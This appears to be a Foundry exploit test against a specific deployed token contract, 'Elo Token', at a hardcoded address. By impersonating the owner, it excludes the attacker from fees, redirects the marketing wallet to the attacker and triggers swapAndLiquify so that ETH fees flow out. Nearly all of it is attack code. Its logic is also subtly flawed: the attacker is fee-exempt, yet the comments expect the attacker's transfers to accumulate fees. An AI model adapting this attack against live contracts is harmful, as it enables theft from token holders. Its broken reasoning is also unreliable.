// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Elo {
    function owner() external view returns (address);
    function setMarketingWallet(address) external;
    function excludeFromFee(address) external;
    function includeInFee(address) external;
    function setSwapAndLiquifyEnabled(bool) external;
    function setMaxTxPercent(uint256) external;
    function setNumTokensToAddLiquidity(uint256) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x35207068e057a01861A654463c01B04cc111E760;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get owner address from contract
        address owner = Elo(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");
        vm.label(TARGET, "Elo Token");

        // Impersonate owner for setup
        vm.startPrank(owner);

        // First, exclude attacker from fees to avoid paying taxes when transferring
        Elo(TARGET).excludeFromFee(attacker);

        // Set marketing wallet to attacker address
        Elo(TARGET).setMarketingWallet(attacker);

        // Ensure swapAndLiquify is enabled (should be by default)
        Elo(TARGET).setSwapAndLiquifyEnabled(true);

        // Increase maxTxAmount to allow large transfers
        Elo(TARGET).setMaxTxPercent(type(uint256).max);

        // Set numTokensSellToAddToLiquidity to a lower value to trigger more easily
        Elo(TARGET).setNumTokensToAddLiquidity(1 * 10**9);

        vm.stopPrank();

        // Give attacker some initial ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = address(attacker).balance;

        // Get token contract
        Elo token = Elo(TARGET);

        // Get owner address
        address owner = token.owner();

        // Impersonate owner to set up attack
        vm.startPrank(owner);

        // Make sure attacker is excluded from fees
        token.excludeFromFee(attacker);

        // Set marketing wallet to attacker (redundant but safe)
        token.setMarketingWallet(attacker);

        // Ensure swap is enabled
        token.setSwapAndLiquifyEnabled(true);

        // Get the pair address to avoid triggering swap from pair
        address pair = token.uniswapV2Pair();

        // Get some tokens to transfer (owner has all tokens initially)
        uint256 ownerBalance = token.balanceOf(owner);

        // Transfer tokens to attacker first (excluded from fee)
        token.transfer(attacker, ownerBalance / 10);

        vm.stopPrank();

        // Now as attacker, transfer tokens to contract to accumulate balance
        // We need to accumulate tokens in contract to trigger swapAndLiquify

        // First, approve contract to spend attacker's tokens
        vm.prank(attacker);
        token.approve(address(token), type(uint256).max);

        // Transfer tokens from attacker to a random address (not pair)
        // This will accumulate fees in contract
        address randomAddress = address(0x123);

        // Make several transfers to accumulate enough tokens in contract
        // We need contract balance >= numTokensSellToAddToLiquidity
        for (uint i = 0; i < 5; i++) {
            vm.prank(attacker);
            token.transfer(randomAddress, token.balanceOf(attacker) / 10);
        }

        // Now trigger swapAndLiquify by making another transfer
        // The contract should have accumulated enough fees
        vm.prank(attacker);
        token.transfer(randomAddress, 1 * 10**9);

        // Check if attacker received ETH
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have received ETH marketing fees");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
